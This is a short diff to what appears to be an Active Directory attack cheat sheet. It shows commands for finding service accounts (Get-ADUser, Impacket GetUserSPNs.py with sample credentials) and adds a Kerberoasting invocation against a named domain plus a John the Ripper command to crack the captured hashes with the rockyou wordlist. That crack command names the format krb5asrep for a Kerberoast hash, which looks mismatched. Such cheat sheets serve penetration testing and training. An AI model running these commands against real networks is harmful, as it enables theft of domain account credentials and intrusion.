@@ -43,7 +43,9 @@ Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincip
 #### Find Service Accounts (Impacket)
 python GetUserSPNs.py domain.local/domainUser:abc123 -outputfile outfile.txt
 #### Do Kerberoasting (PowerView)
-Invoke-Kerberoast
+Invoke-Kerberoast -Domain plum.local
+#### Crack Kerberoast Hash
+john kerberoast.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep
 
 ## ASREPRoast
 ------
